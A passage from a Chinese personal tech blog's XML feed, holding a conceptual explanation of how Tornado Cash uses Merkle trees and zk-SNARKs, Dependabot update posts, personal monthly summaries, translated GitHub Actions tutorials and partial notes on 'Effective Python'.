zk-SNARK。</p><p>我们注意到当用户存款和取款时，使用了两个随机数 secret 和 nullifier，nullifier 的作用是什么呢？当用户取款时，合约其实不知道到底是谁在取款，为了避免用户存入 1 ETH 然后进行多次提取，TC要求当用户发送证明的同时发送 nullifier 的哈希nullifierHash，在zk-SNARK的证明中，他会检查两件事情：一是检查 hash(secret, nullifier) 在 commitment 的列表中，二是 nullifierHash 等于 hash(nullifier)，一旦验证成功，合约就会记录这个哈希。当同一个证明第二次被提交时就会失败，因为对应的 nullifier 哈希已经使用过了，这样就避免了二次提款。</p><h3><span id="tornado-cash-ru-he-bao-cun-commitment-ni">Tornado Cash 如何保存 commitment 呢</span></h3><p>使用 Merkle 树。Merkle树具体参见之前的介绍文章。</p><p>TC 会首先初始化一组叶子节点为 <code>keccak256(&quot;tornado&quot;)</code>，并以这些叶子节点构建一颗 Merkle 树。当用户存款时，对应的 commitment 存入 Merkle 树的第一个叶子节点，然后合约更新整棵 Merkle 树，然后是第二个用户的commitment 存入第二个叶子节点并更新整棵 Merkle 树，依次类推。</p><p><img src="https://user-images.githubusercontent.com/3297411/188539564-5178bafe-dd46-4409-8de5-fdcc194e88e4.png" alt="Untitled"></p><p>如何证明 commitment 在这棵 Merkle 树中呢？</p><p><img src="https://user-images.githubusercontent.com/3297411/188539594-233fbff1-9cc8-43c9-99a2-86a7045f3efe.png" alt="Untitled 1"></p><p>假设需要证明c3在这棵Merkel中，我们需要找到从叶子节点 c3 到根的路径过程中的哈希，使得他们与 c3 依次进行 hash 可以得到根哈希，即图中绿色节点的哈希列表。</p><p>Tornado Cash 中，我们需要提供这些节点哈希，并通过 zk-SNARK 生成零知识证明，以此证明 c3 在这棵以 root（<code>=h(h(h(c0,c1),h(c2,c3)),h(h(c4,c5), z1))</code>）为根的 Merkle 中，但却不用告诉大家 c3 的值。</p><p><img src="https://user-images.githubusercontent.com/3297411/188539613-fe0ccd14-c7e7-4143-847a-e71d3b475e1f.png" alt="Untitled 2"></p><p>因此我们将证明 proof 和 Merkle 树根 root 发送给合约，一旦合约验证成功，我们就可以取出之前存入的存款。</p><h2><span id="solidity-zhong-de-zk-snark-shi-xian">solidity 中的 zk-SNARK 实现</span></h2><p>TC 合约包含三个部分：</p><ol><li>存款和取款合约，用于与用户交互；</li><li>Merkle 树，用于记录存款哈希；</li><li>zk-SNARK 验证器合约，用于验证取款时证明合法。</li></ol><p>zk-SNARK 验证器合约由 circom 编写的验证电路通过 snarkjs 库生成。</p><h2><span id="can-kao">参考</span></h2><ul><li><a href="https://www.youtube.com/watch?v=z_cRicXX1jI">Tornado Cash - How it Works | DeFi + Zero Knowledge Proof</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Tornado Cash 基本原理
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>chore(deps): bump ua-parser-js from 0.7.22 to 0.7.28</title>
    <link href="https://qiwihui.com/qiwihui-blog-141/"/>
    <id>https://qiwihui.com/qiwihui-blog-141/</id>
    <published>2021-08-05T03:31:22.000Z</published>
    <updated>2022-08-13T01:54:25.350Z</updated>
    
    <content type="html"><![CDATA[<p>Bumps <a href="https://github.com/faisalman/ua-parser-js">ua-parser-js</a> from 0.7.22 to 0.7.28.</p><details><summary>Commits</summary><ul><li><a href="https://github.com/faisalman/ua-parser-js/commit/1d3c98a10c23915046a362c4e3b3b503fb40d611"><code>1d3c98a</code></a> Revert breaking fix <a href="https://github-redirect.dependabot.com/faisalman/ua-parser-js/issues/279">#279</a> and release as 0.7.28</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/535f11bd2403910f29dabe6f90adb014ad016747"><code>535f11b</code></a> Delete redundant code</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/642c0399e831e27c5c86c3b7afee02e876250d01"><code>642c039</code></a> Fix <a href="https://github-redirect.dependabot.com/faisalman/ua-parser-js/issues/492">#492</a> LG TV WebOS detection</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/3edacddb2474429c55fa39d1e6222d50bbf9266f"><code>3edacdd</code></a> Merge branch 'master' into develop</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/acc0b91ff5defa2ca9a722874e27277879292907"><code>acc0b91</code></a> Update contributor list</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/f726dcd1ae4fea51e99b8ca574a1be51fbd70e1a"><code>f726dcd</code></a> Merge branch 'master' into develop</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/383ca587ef9b8daffcf652ac39fc9b8f3708572e"><code>383ca58</code></a> More test for tablet devices</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/7c8aa435b26cb14537423cd5fe4ce077e0661db2"><code>7c8aa43</code></a> Minor rearrangement</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/09aa9105dc370ded9275f70eae1f4eb67394966c"><code>09aa910</code></a> Add new device &amp; browser: Tesla</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/557cc2198d88068892eec6b61f2b2f4fe6e96314"><code>557cc21</code></a> More test for latest phones with unique form factor (fold/flip/qwerty/swivel)</li><li>Additional commits viewable in <a href="https://github.com/faisalman/ua-parser-js/compare/0.7.22...0.7.28">compare view</a></li></ul></details><br><p><a href="https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores"><img src="https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=ua-parser-js&amp;package-manager=npm_and_yarn&amp;previous-version=0.7.22&amp;new-version=0.7.28" alt="Dependabot compatibility score"></a></p><p>Dependabot will resolve any conflicts with this PR as long as you don’t alter it yourself. You can also trigger a rebase manually by commenting <code>@dependabot rebase</code>.</p><hr><details><summary>Dependabot commands and options</summary><br><p>You can trigger Dependabot actions by commenting on this PR:</p><ul><li><code>@dependabot rebase</code> will rebase this PR</li><li><code>@dependabot recreate</code> will recreate this PR, overwriting any edits that have been made to it</li><li><code>@dependabot merge</code> will merge this PR after your CI passes on it</li><li><code>@dependabot squash and merge</code> will squash and merge this PR after your CI passes on it</li><li><code>@dependabot cancel merge</code> will cancel a previously requested merge and block automerging</li><li><code>@dependabot reopen</code> will reopen this PR if it is closed</li><li><code>@dependabot close</code> will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually</li><li><code>@dependabot ignore this major version</code> will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot ignore this minor version</code> will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot ignore this dependency</code> will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot use these labels</code> will set the current labels as the default for future PRs for this repo and language</li><li><code>@dependabot use these reviewers</code> will set the current reviewers as the default for future PRs for this repo and language</li><li><code>@dependabot use these assignees</code> will set the current assignees as the default for future PRs for this repo and language</li><li><code>@dependabot use this milestone</code> will set the current milestone as the default for future PRs for this repo and language</li></ul><p>You can disable automated security fix PRs for this repo from the <a href="https://github.com/qiwihui/blog/network/alerts">Security Alerts page</a>.</p></details><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      chore(deps): bump ua-parser-js from 0.7.22 to 0.7.28
    
    </summary>
    
    
      <category term="dependencies" scheme="https://qiwihui.com/tags/dependencies/"/>
    
  </entry>
  
  <entry>
    <title>chore(deps): bump underscore from 1.11.0 to 1.13.1</title>
    <link href="https://qiwihui.com/qiwihui-blog-140/"/>
    <id>https://qiwihui.com/qiwihui-blog-140/</id>
    <published>2021-07-05T12:46:09.000Z</published>
    <updated>2022-08-13T01:54:25.520Z</updated>
    
    <content type="html"><![CDATA[<p>Bumps <a href="https://github.com/jashkenas/underscore">underscore</a> from 1.11.0 to 1.13.1.</p><details><summary>Commits</summary><ul><li><a href="https://github.com/jashkenas/underscore/commit/943977e34e2279503528a71ddcc2dd5f96483945"><code>943977e</code></a> Merge branch 'umd-alias', tag 1.13.1 release</li><li><a href="https://github.com/jashkenas/underscore/commit/5630f882932552ba23f34b57f91c0c6e2a38ad82"><code>5630f88</code></a> Add version 1.13.1 to the change log</li><li><a href="https://github.com/jashkenas/underscore/commit/5aa5b526a94edf487ab1d4a4e3cde8f7749e6d2c"><code>5aa5b52</code></a> Update the bundle sizes</li><li><a href="https://github.com/jashkenas/underscore/commit/76c8d8a05db2d0f9ecfb193ba2ab7780c4a26441"><code>76c8d8a</code></a> Bump the version to 1.13.1</li><li><a href="https://github.com/jashkenas/underscore/commit/9cda0b09742c9ed6ae5e1bccb709b63f32a04f45"><code>9cda0b0</code></a> Add some build clarifications to the documentation (<a href="https://github-redirect.dependabot.com/jashkenas/underscore/issues/2923">#2923</a>)</li><li><a href="https://github.com/jashkenas/underscore/commit/8b5928c04b9a61a99e2704740b80287247e9f47a"><code>8b5928c</code></a> Revert .gitignore underscore.js from 57a4a0e (fix <a href="https://github-redirect.dependabot.com/jashkenas/underscore/issues/2923">#2923</a>)</li><li><a href="https://github.com/jashkenas/underscore/commit/7054a54d63af2ed1c99eb3707836da709b5e625e"><code>7054a54</code></a> Update generated sources and tag 1.13.0 release</li><li><a href="https://github.com/jashkenas/underscore/commit/37dc52a61054674115be560ab9cbdd26b05031ed"><code>37dc52a</code></a> Merge pull request <a href="https://github-redirect.dependabot.com/jashkenas/underscore/issues/2921">#2921</a> from jgonggrijp/prepare-1.13.0</li><li><a href="https://github.com/jashkenas/underscore/commit/5511d129881253807d728cc6a21fff55953ae4f9"><code>5511d12</code></a> Add version 1.13.0 to the change log</li><li><a href="https://github.com/jashkenas/underscore/commit/efe5fbf4a1d43c9a88c1646aa5ab53a4745655b8"><code>efe5fbf</code></a> Bump the version to 1.13.0</li><li>Additional commits viewable in <a href="https://github.com/jashkenas/underscore/compare/1.11.0...1.13.1">compare view</a></li></ul></details><details><summary>Maintainer changes</summary><p>This version was pushed to npm by <a href="https://www.npmjs.com/~jgonggrijp">jgonggrijp</a>, a new releaser for underscore since your current version.</p></details><br><p><a href="https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores"><img src="https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=underscore&amp;package-manager=npm_and_yarn&amp;previous-version=1.11.0&amp;new-version=1.13.1" alt="Dependabot compatibility score"></a></p><p>Dependabot will resolve any conflicts with this PR as long as you don’t alter it yourself. You can also trigger a rebase manually by commenting <code>@dependabot rebase</code>.</p><hr><details><summary>Dependabot commands and options</summary><br><p>You can trigger Dependabot actions by commenting on this PR:</p><ul><li><code>@dependabot rebase</code> will rebase this PR</li><li><code>@dependabot recreate</code> will recreate this PR, overwriting any edits that have been made to it</li><li><code>@dependabot merge</code> will merge this PR after your CI passes on it</li><li><code>@dependabot squash and merge</code> will squash and merge this PR after your CI passes on it</li><li><code>@dependabot cancel merge</code> will cancel a previously requested merge and block automerging</li><li><code>@dependabot reopen</code> will reopen this PR if it is closed</li><li><code>@dependabot close</code> will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually</li><li><code>@dependabot ignore this major version</code> will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot ignore this minor version</code> will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot ignore this dependency</code> will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot use these labels</code> will set the current labels as the default for future PRs for this repo and language</li><li><code>@dependabot use these reviewers</code> will set the current reviewers as the default for future PRs for this repo and language</li><li><code>@dependabot use these assignees</code> will set the current assignees as the default for future PRs for this repo and language</li><li><code>@dependabot use this milestone</code> will set the current milestone as the default for future PRs for this repo and language</li></ul><p>You can disable automated security fix PRs for this repo from the <a href="https://github.com/qiwihui/blog/network/alerts">Security Alerts page</a>.</p></details><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      chore(deps): bump underscore from 1.11.0 to 1.13.1
    
    </summary>
    
    
      <category term="dependencies" scheme="https://qiwihui.com/tags/dependencies/"/>
    
  </entry>
  
  <entry>
    <title>七月小结（2021.07）</title>
    <link href="https://qiwihui.com/qiwihui-blog-145/"/>
    <id>https://qiwihui.com/qiwihui-blog-145/</id>
    <published>2021-02-08T10:03:56.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="qi-yue-fa-sheng-liao-shi-me-shi-qing">七月发生了什么事情</span></h3><ol><li>恢复断更一年的《<a href="https://pyweekly.qiwihui.com/">Python 周报（Python weekly）</a>》和对应的公众号；</li><li>咨询猫行为专家，很大程度解决猫猫晚上闹人和喂食的问题；</li><li>开始学习蛙泳；</li><li>上线了一个 macOS APP：<a href="https://egges.qiwihui.com/">Egges</a>，一个 macOS 平台上的 Elasticsearch 集群管理用具。</li></ol><h3><span id="qi-yue-du-shu">七月读书</span></h3><p>《爱是一种选择》和《非暴力沟通》都没有读完</p><h3><span id="qi-yue-chuang-zuo">七月创作</span></h3><ol><li>更新了 <a href="https://www.youtube.com/channel/UCNrMyfwfsQ98FQWcUKDiZIw">two cats’ diary</a> 3支影片；</li><li>一篇《DDIA》读书笔记：<a href="https://github.com/qiwihui/blog/issues/143">第一章：可靠性，可扩展性，可维护性</a></li></ol><h3><span id="qi-yue-guan-ying">七月观影</span></h3><ul><li>《<a href="https://movie.douban.com/subject/35332568/">奇巧计程车 ODD TAXI (2021)</a>》</li><li>《<a href="https://movie.douban.com/subject/30331432/">Loki</a>》</li><li>《黑寡妇》</li><li>《<a href="https://m.douban.com/movie/subject/27622447/">小偷家族</a>》</li><li>《<a href="https://movie.douban.com/subject/34874432/">花束般的恋爱</a>》</li><li>《<a href="https://movie.douban.com/subject/34908206//">Rick and Morty（第五季）</a>》</li></ul><h3><span id="ba-yue-ju-jiao-de-shi-qing">八月聚焦的事情</span></h3><ol start="0"><li>完成一次五公里，完成五公里30分钟；</li><li>学会蛙泳；</li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      七月小结（2021.07）
    
    </summary>
    
    
      <category term="总结" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>六月小结（2021.06）</title>
    <link href="https://qiwihui.com/qiwihui-blog-144/"/>
    <id>https://qiwihui.com/qiwihui-blog-144/</id>
    <published>2021-02-08T09:36:54.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下六月发生的事情</p><h3><span id="liu-yue-fa-sheng-liao-shi-me-shi-qing">六月发生了什么事情</span></h3><ol><li>养成了早上六点半早起跑步锻炼的习惯；</li><li>因为我对家里人的拖累症，和太太之间的争吵消耗了很多元气，算然成长了，但对她对我来说却很累；</li><li>向老板提出了涨工资要求，并顺利完成；</li><li>拜访了朋友的新家，很开心。</li></ol><h3><span id="liu-yue-guan-ying">六月观影</span></h3><p>日剧和电影看得多一些啊。</p><ul><li>《浪客剑心》、《浪客剑心：京都大火篇》、《浪客剑心：传说的完结篇》</li><li>《第十一回》</li><li>:+1:《短剧开始啦》</li><li>《全裸导演2》</li></ul><h3><span id="liu-yue-du-shu">六月读书</span></h3><p>六月开始涉及一些心理学的书籍，但是都在读。</p><h3><span id="liu-yue-chuang-zuo">六月创作</span></h3><ul><li>开通了Youtube频道《Two cats diary》，用来记录两只猫猫的日常生活，发布影片3支；</li><li>没有博客更新和其他更新。</li></ul><h3><span id="qi-yue-ju-jiao-de-shi-qing">七月聚焦的事情</span></h3><p><strong>1. 早起和锻炼</strong>争取能在六点钟起床，做半小时自己喜欢的，有未来意义的事情，然后出门跑步锻炼；</p><p><strong>2. 心理咨询</strong>继续和咨询师探讨自己家庭给自己带来的困扰；</p><p><strong>3. 准备雅思考试</strong>完全定下雅思考试时间，复习规划；</p><p><strong>4. 工作技能</strong></p><ul><li>数据结构和算法；</li><li>系统设计和分布式理论；</li></ul><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      六月小结（2021.06）
    
    </summary>
    
    
      <category term="总结" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第19天：下载文件</title>
    <link href="https://qiwihui.com/qiwihui-blog-102/"/>
    <id>https://qiwihui.com/qiwihui-blog-102/</id>
    <published>2020-11-04T08:10:57.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>昨天，我们研究了如何在工作流运行过程中<a href="https://qiwihui.com/qiwihui-blog-101/">上传文件</a>，然后手动下载它们。这在许多情况下都非常有用，但是我认为使用文件的更强大的部分是使用工件在不同步骤之间传输文件。</p><p>例如：你可能有一个项目，该项目在多个平台上创建二进制文件，将这些二进制文件作为文件上载，然后发布到最后运行作业以将这些不同的二进制文件聚合到一个程序包中。</p><p>或者，你可能想散开──拥有一个创建单个文件的作业，然后在不同平台上运行多个作业以测试该文件。</p><span id="more"></span><p>在这里，我有一个测试我的本机代码的工作流程：首先，我构建本机代码测试运行器，该运行器使用 <a href="https://github.com/clar-test/clar">clar</a> 单元测试框架，以便它编译一个以 <code>testapp</code> 命名的包含我所有单元测试的二进制文件。该二进制文件作为名为的文件上传 <code>tests</code>。然后，我将创建一个依赖于第一个<code>build</code> 作业的矩阵作业。它将使用最新版本的Ubuntu，Debian，CentOS和Alpine建立一个在容器内执行的矩阵。每个作业将下载 <code>tests</code> 构建作业中生成的文件，然后将设置 testapp 为可执行文件（因为文件不保留Unix权限），最后运行测试应用程序。</p><script src="https://gist.github.com/ethomson/9add864c916083aaf0c0d3b0bd092351.js"></script><p>当我运行它时，构建将产生一个文件，并且当该构建完成时，我的测试作业将全部开始，下载该文件，然后运行它。</p><p><img src="https://user-images.githubusercontent.com/3297411/79038436-d64bd580-7c0b-11ea-8984-e28ba788f465.png" alt="image"></p><p>你可以看到，上传文件对于生成构建输出非常有用，你可以在后续构建步骤中下载和使用这些输出。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_19_downloading_artifacts.html">https://www.edwardthomson.com/blog/github_actions_19_downloading_artifacts.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第19天：下载文件
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第18天：文件</title>
    <link href="https://qiwihui.com/qiwihui-blog-101/"/>
    <id>https://qiwihui.com/qiwihui-blog-101/</id>
    <published>2020-11-04T07:34:08.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>当你构建执行pull request验证或持续集成构建的工作流时，你通常希望获取该构建输出并保存它，以便以后使用。有时创建一个软件包并将其发布到<a href="https://qiwihui.com/qiwihui-blog-92/">GitHub packages</a>之类的软件包仓库中是有意义的 。但是有时你只想将其存储为构建输出的一部分，以后可以下载。GitHub Actions允许你将文件上传为工作流的一部分，以供日后下载。</p><p>要将文件作为构建的一部分进行上传，可以使用 <a href="https://github.com/actions/upload-artifact"><code>upload-artifact</code></a> 操作。你可以指定为其创建文件的路径–你可以指定单个文件或文件夹，以及文件的名称。你指定的路径将以你指定的工件名称存档到一个zip文件中。</p><span id="more"></span><p>例如，我可以构建和测试我的项目，然后创建一个nuget包，最后将该nuget包作为文件上传。</p><script src="https://gist.github.com/ethomson/5101813150c57362ee072ee696d60be7.js"></script><p>现在，当我的工作流程运行时，我将在该运行的右上角获得一个选项，向我展示我的文件并让我下载它们。</p><p><img src="https://user-images.githubusercontent.com/3297411/79037750-64bd5880-7c06-11ea-8267-76a83bafe0ea.png" alt="image"></p><p>将构建输出作为文件上载可以与包仓库一起使用：我喜欢将CI构建包上载到GitHub packages，并从pull request中创建工件。这使我可以选择在本地运行和测试PR验证构建──我可以将它们作为文件下载──而不会影响我的GitHub Packages帐户。如果你希望选择在本地运行，那很好，即使你很少这样做。</p><p>原文连接：<a href="https://www.edwardthomson.com/blog/github_actions_18_artifacts.html">https://www.edwardthomson.com/blog/github_actions_18_artifacts.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第18天：文件
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第17天：依赖作业</title>
    <link href="https://qiwihui.com/qiwihui-blog-100/"/>
    <id>https://qiwihui.com/qiwihui-blog-100/</id>
    <published>2020-11-04T07:02:59.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>如果你设置了包含多个作业的工作流程（无论是<a href="https://qiwihui.com/qiwihui-blog-85/">基于矩阵的工作流程</a>还是只是单独定义了作业），这些作业将彼此独立地并行运行。通常，这是理想的。只要有可用的计算机即可执行你的作业。</p><p>但是有时你希望能够设置依赖于其他作业的作业。例如，你可能有一些要测试的服务。但是为了节省成本，你只想在实际运行测试时运行那些服务。因此，你可能想要一个启动服务的作业，一个运行测试的工作业，然后是一个停止服务的作业。</p><p>要指定作业之间的依赖关系，可以使用 <code>needs</code> 关键字指示哪些作业依赖于其他作业的完成。</p><span id="more"></span><script src="https://gist.github.com/ethomson/1b52ca3b472b10a16972414f96c474fb.js"></script><p>现在，这似乎不是一个很好的例子–我们可能不使用单独的作业，而可能只在一个作业中完成了这三个步骤。但是使用作业可以使我们“成长”：实际上，我们可以在一个作业中设置测试基础结构，然后并行运行多个作业以对其进行测试，然后最后运行清理作业。</p><p><img src="https://user-images.githubusercontent.com/3297411/79037364-c380d300-7c02-11ea-9bcb-682b6f1bd2b1.png" alt="image"></p><p>这样一来，我们就可以在多个平台上并行运行测试作业，并通过设置将这些作业预定下来，然后停止作业。我们可以通过定义我们的安装作业，然后定义依赖于它的许多作业，然后依赖于这些作业的最终的工作。这通常称为“扇出”和“扇入”。</p><script src="https://gist.github.com/ethomson/11febc97d2b41187f5cbb8ddaf9bfdce.js"></script><p>通过此工作流程，我们的设置作业将运行，然后将使用矩阵在Windows，macOS和Linux上运行构建和测试作业，最后，我们将关闭启动的那些测试资源。</p><p><img src="https://user-images.githubusercontent.com/3297411/79037374-e3b09200-7c02-11ea-8618-5026cfdd9b63.png" alt="image"></p><p>你可以通过相互指定作业来轻松地构建高级工作流， <code>needs</code> 以指定工作流的依赖关系图。</p><p>原文连接：<a href="https://www.edwardthomson.com/blog/github_actions_17_dependent_jobs.html">https://www.edwardthomson.com/blog/github_actions_17_dependent_jobs.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第17天：依赖作业
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>《编写高质量Python代码的59个有效方法》笔记</title>
    <link href="https://qiwihui.com/qiwihui-blog-79/"/>
    <id>https://qiwihui.com/qiwihui-blog-79/</id>
    <published>2020-09-01T03:42:26.000Z</published>
    <updated>2024-05-15T02:25:31.471Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="1-python-ban-ben">1. Python版本</span></h3><ul><li>Python 3</li><li>CPython, PyPy, Jython, IronPython</li></ul><h3><span id="2-pep8">2. PEP8</span></h3><p>代码风格一致</p><h3><span id="3-bytes-str-unicode-zhi-tao-lun-python-3">3. bytes，str，unicode（只讨论Python 3）</span></h3><p>Python 3中：bytes实例包含原始的8位值，str实例包含Unicode字符。把Unicode字符表示为二进制数据，最常见的编码方式是UTF-8。</p><ul><li>Unicode 字符 =&gt; 二进制：<code>encode</code></li><li>二进制 =&gt; Unicode 字符：<code>decode</code></li></ul><span id="more"></span><p>Python程序中，一定要把编码和解码放在最外围来操作。程序的核心部分应该使用Unicode字符类型，而且不要对字符编码做任何假设。</p><p>定义 <code>to_str</code> 和 <code>to_bytes</code> 方法。</p><p>Python 3中，<code>open</code>默认以<code>utf-8</code>编码打开，而不是二进制。</p><h3><span id="4-yong-fu-zhu-han-shu-lai-qu-dai-fu-za-biao-da-shi">4. 用辅助函数来取代复杂表达式</span></h3><h3><span id="5-xu-lie-qie-pian">5. 序列切片</span></h3><ol><li><code>list</code>，<code>str</code>，<code>bytes</code> 以及实现了 <code>__getitem__</code> 和 <code>__setitem__</code>  的类；</li><li>切片时下表可以越界，但访问元素时不能；</li><li>当start索引为0或者end索引为列序列长度时，应该将其省略；</li><li>对list赋值时，使用切片会把原序列相关范围的值替换成新值，即使长度不一样；</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; a = [1,2,3,4,5,6,7]</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; a[1:6] = [9]</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; a</span></span><br><span class="line">[1,9,7]</span><br></pre></td></tr></table></figure><h3><span id="6-bu-jin-shi-qie-ge">6. 步进式切割</span></h3><ol><li>避免在一个切片操作中同时使用 <code>start</code>，<code>end</code>和<code>stride</code>；</li><li>避免使用负数做stride；</li></ol><h3><span id="7-yong-lie-biao-tui-dao-dai-ti-map-he-filter">7. 用列表推导代替map和filter</span></h3><ol><li>list, 字典和集合支持列表推导；</li><li>代码清晰；</li></ol><h3><span id="8-bu-yao-shi-yong-han-you-liang-ge-yi-shang-biao-da-shi-de-lie-biao-tui-dao">8. 不要使用含有两个以上表达式的列表推导</span></h3><p>会变得难理解</p><h3><span id="9-yong-sheng-cheng-qi-biao-da-shi-lai-gai-xie-shu-ju-liang-jiao-da-de-lie-biao-tui-dao-shi">9. 用生成器表达式来改写数据量较大的列表推导式</span></h3><ol><li><p>数据量较大时，列表推导式会占用大量内存</p></li><li><p><code>()</code></p></li></ol><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a_long_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">value = [<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> a_long_list]</span><br><span class="line"><span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure><p>=&gt;</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">value = (<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> a_long_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(value))</span><br></pre></td></tr></table></figure><ol start="3"><li>可以组合</li></ol><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">roots = ((v, v ** <span class="number">0.5</span>)<span class="keyword">for</span> v <span class="keyword">in</span> value)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(roots))</span><br></pre></td></tr></table></figure><h3><span id="10-range-gt-enumerate">10. <code>range</code> =&gt; <code>enumerate</code></span></h3><p><code>enumerate</code> 可以把各种迭代器包装成生成器，以便稍后产生输出值。<code>enumerate</code> 计数下表默认从 <code>0</code> 开始，可以修改。</p><h3><span id="11-yong-zip-tong-shi-bian-li-liang-ge-die-dai-qi">11. 用 <code>zip</code> 同是遍历两个迭代器</span></h3><ol><li>迭代器长度相同</li><li>不同时使用 <code>itertools.zip_longest</code></li></ol><h3><span id="12-bu-yao-zai-for-he-while-xun-huan-hou-mian-xie-else">12. 不要在 <code>for</code> 和 <code>while</code> 循环后面写 <code>else</code></span></h3><p>与 <code>if/else</code>, <code>try/except/else</code> 的 <code>else</code> 